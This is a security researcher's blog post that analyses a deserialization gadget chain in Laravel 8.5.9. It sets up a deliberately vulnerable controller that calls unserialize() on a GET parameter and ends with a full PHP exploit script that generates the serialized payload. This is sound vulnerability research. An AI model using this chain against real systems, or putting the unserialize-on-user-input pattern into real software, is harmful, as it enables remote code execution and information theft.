=== Content from s1mple-top.github.io_6baa2ac6_20250115_084020.html ===


![Close](/img/close.png)

* [Home](/ "Home")
* [archives](/archives "archive")
* Works
* Links
  + [陆队](https://blog.zeddyu.info/)
  + [书鱼](https://st4ck.gitee.io/)
  + [菠萝吹雪](https://boluochuixue.top/)
  + [rmb](https://rmb122.com/)

* [About](/about.html "about")
* [RSS](/atom.xml "rss")

[![Logo](/img/logo.png)](/ "Logo")

* [s1mple](/)
* Always Creative.
* Welcome!

More
Toggle navigation

2021-03-09

# Laravel8 new pop chain mining process

## Installation method:

| ``` 1 ``` | ``` composer create-project laravel/laravel=8.5.9 laravel8 ``` |
| --- | --- |

## Manually add deserialization point:

/routes/web.php：

| ``` 123 ``` | ``` <?phpRoute::get("/","\App\Http\Controllers\DemoController@demo");?> ``` |
| --- | --- |

Add democontroller controller under app/Http/Controllers/

| ``` 12345678910111213141516 ``` | ``` <?phpnamespace App\Http\Controllers;class DemoController extends Controller{    public function demo()    {        if(isset($_GET['c'])){            $code = $_GET['c'];            unserialize($code);        }        else{            highlight_file(__FILE__);        }    }} ``` |
| --- | --- |

### The results are as follows:

[![68cAcd.png](https://s3.ax1x.com/2021/03/09/68cAcd.png)](https://imgtu.com/i/68cAcd)

### New version of laravel pop chain process:

The destruct function is used to cut in under the class illuminate\broadcasting\pendingbroadcast;

| ``` 1234 ``` | ``` public function __destruct(){    $this->events->dispatch($this->event);} ``` |
| --- | --- |

To call the dispatch method under the illuminate\bus\dispatcher class;

| ``` 123456 ``` | ``` public function dispatch($command){    return $this->queueResolver && $this->commandShouldBeQueued($command)                    ? $this->dispatchToQueue($command)                    : $this->dispatchNow($command);} ``` |
| --- | --- |

Controls the queueresolver and command variables；make them true，so we can see dispatchToQueue function

| ``` 1234 ``` | ``` protected function commandShouldBeQueued($command){    return $command instanceof ShouldQueue;} ``` |
| --- | --- |

Obviously, the shouldqueue interface class needs to be inherited；We found the class Illuminate\Broadcasting\BroadcastEvent globally;

| ``` 1 ``` | ``` class BroadcastEvent implements ShouldQueue ``` |
| --- | --- |

After successfully entering the corresponding method, we audit the method;

| ``` 12345678910111213141516 ``` | ``` public function dispatchToQueue($command)    {        $connection = $command->connection ?? null;        $queue = call_user_func($this->queueResolver, $connection);        if (! $queue instanceof Queue) {            throw new RuntimeException('Queue resolver did not return a Queue implementation.');        }        if (method_exists($command, 'queue')) {            return $command->queue($queue, $command);        }        return $this->pushCommandToQueue($queue, $command);    } ``` |
| --- | --- |

Notice the call\_user\_func method, we find that both the queueresolver parameter and the connection parameter are controllable；Because call\_user\_\_func，We can make the first parameter an array，So as to call the corresponding method under the corresponding class;

Here I use the\_\_ Invoke method from Illuminate\View\InvokableComponentVariable;Because the parameters of this method are controllable, you can also call sensitive functions

| ``` 12345 ``` | ``` public function __invoke(){    return call_user_func($this->callable);} ``` |
| --- | --- |

Here we can control the callable; we can directly pass in the sensitive function to execute it;

exp如下：

| ``` 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152 ``` | ``` <?phpnamespace Illuminate\Broadcasting{class PendingBroadcast{	protected $events;	protected $event;	public function __construct($events, $event)    {        $this->event = $event;        $this->events = $events;    }}}namespace Illuminate\Bus{class Dispatcher{		protected $queueResolver;	public function __construct($queueResolver)    {        $this->queueResolver = $queueResolver;    }}}namespace Illuminate\Broadcasting{class BroadcastEvent{	protected $connection;	public function __construct($connection){		$this->connection = $connection;	}}}namespace Illuminate\View{class InvokableComponentVariable{	protected $callable;	public function __construct($callable)    {        $this->callable = $callable;    }}}namespace{	$d = new Illuminate\View\InvokableComponentVariable('phpinfo');	$c = new Illuminate\Broadcasting\BroadcastEvent(true);	$b = new Illuminate\Bus\Dispatcher(array($d,'__invoke'));	$a = new Illuminate\Broadcasting\PendingBroadcast($b,$c);	echo urlencode(serialize($a));} ``` |
| --- | --- |

It can cause function execution and information leakage;

[![686w6A.png](https://s3.ax1x.com/2021/03/09/686w6A.png)](https://imgtu.com/i/686w6A)

---

[← java HashMap理解](/2021/03/27/java-HashMap%E7%90%86%E8%A7%A3/)
[Analysis-of-utilization-chain-of-thinkphpV6-deserialization-pop →](/2020/12/09/Analysis-of-utilization-chain-of-thinkphpV6-deserialization-pop/)

© 2014, Content By s1mple. All Rights Reserved.

Theme By [Kieran](//go.kieran.top)


